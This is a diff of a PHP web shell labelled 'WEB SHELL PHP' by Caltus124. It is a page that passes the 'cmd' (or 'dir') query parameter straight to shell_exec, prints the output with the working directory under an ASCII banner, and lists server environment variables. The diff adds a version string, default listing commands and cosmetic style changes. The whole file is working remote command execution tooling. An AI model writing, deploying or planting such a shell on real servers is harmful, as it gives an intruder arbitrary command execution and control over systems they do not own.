@@ -1,5 +1,6 @@
 <?php
 
+$version = "1.0.1";
 $date = date("Y-m-d H:i:s");
 $indicesServer = array('PHP_SELF',
 'argv',
@@ -43,13 +44,31 @@ $indicesServer = array('PHP_SELF',
 'ORIG_PATH_INFO') ;
 
 
-if (PHP_OS === "Linux") {
-	//echo "L'os est Linux";
-	//$cmd = "ls -la";
+if (empty($_GET['cmd'])) {
+
+	if (PHP_OS === "Linux") {
+		//echo "L'os est Linux";
+		$cmd = "ls -la";
+		$pwd = shell_exec("pwd");
+	}else{
+		//echo "L'os est Windows";
+		$cmd = "dir";
+		$pwd = shell_exec("cd");
+	}
+
 }else{
-	//echo "L'os est Windows";
-	//$cmd = "dir";
+
+	if (PHP_OS === "Linux") {
+		//echo "L'os est Linux";
+		$cmd = $_GET['cmd'];
+		$pwd = shell_exec("pwd");
+	}else{
+		//echo "L'os est Windows";
+		$cmd = $_GET['dir'];
+		$pwd = shell_exec("cd");
+	}
 }
+
 
 ?>
 
@@ -59,7 +78,7 @@ if (PHP_OS === "Linux") {
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>WEB SHELL BY Caltus124</title>
+	<title>WEB SHELL PHP <?php echo $version;?></title>
 </head>
 <body>
 
@@ -70,7 +89,7 @@ if (PHP_OS === "Linux") {
 		margin: 0;
 		padding: 0;
 		overflow-x: hidden;
-		background-color: gray;
+		background-color: #473A38;
 
 	}
 
@@ -131,7 +150,7 @@ if (PHP_OS === "Linux") {
 	.info{
 		margin-top: 50px;
 		width: 80%;
-		height: 1600px;
+		height: 1780px;
 		border: 1px solid black;
 		margin-bottom: 50px;
 		background-color: black;
@@ -156,7 +175,7 @@ if (PHP_OS === "Linux") {
 
 <header>
 	<div>
-		<h1>Web Shell - Caltus124 - Server OS:<?php echo " ".PHP_OS." ".$date; ?></h1>
+		<h1>Web Shell PHP - Caltus124 - Server OS:<?php echo " ".PHP_OS." ".$date; ?></h1>
 	</div>
 </header>
 
@@ -164,13 +183,22 @@ if (PHP_OS === "Linux") {
 	<section>
 		<?php
 			$root = "root@shell$";
-			$cmd = $_GET['cmd'];
 			$output = shell_exec($cmd);
 		?>
 		<textarea readonly>
-			<?php 
-				echo $root." ".$cmd." ".$output;
-			?>
+ _       ____________  ______  _____ __  __________    __     __ __ 
+| |     / / ____/ __ )/ ____ \/ ___// / / / ____/ /   / /  __/ // /_
+| | /| / / __/ / __  / / __ `/\__ \/ /_/ / __/ / /   / /  /_  _  __/
+| |/ |/ / /___/ /_/ / / /_/ /___/ / __  / /___/ /___/ /__/_  _  __/ 
+|__/|__/_____/_____/\ \__,_//____/_/ /_/_____/_____/_____//_//_/    
+                     \____/  
+		<?php
+		echo "\n";
+		echo $root." ".$pwd;
+		echo "# ".$cmd;
+		echo "\n";
+		echo $output;
+		?>
 		</textarea>
 		<form method="GET" action="#">
 			<input type="text" name="cmd">					
@@ -178,7 +206,7 @@ if (PHP_OS === "Linux") {
 	</section>
 	<section class="info">
 		<?php 
-			echo '<table cellpadding="10" style="color: white; font-family: sans-serif;">' ;
+			echo '<table border=1 cellpadding="10" style="color: white; font-family: sans-serif; margin-left: auto; margin-right: auto; margin-top: 50px;">' ;
 			foreach ($indicesServer as $arg) {
 			    if (isset($_SERVER[$arg])) {
 			        echo '<tr><td>'.$arg.'</td><td>' . $_SERVER[$arg] . '</td></tr>' ;
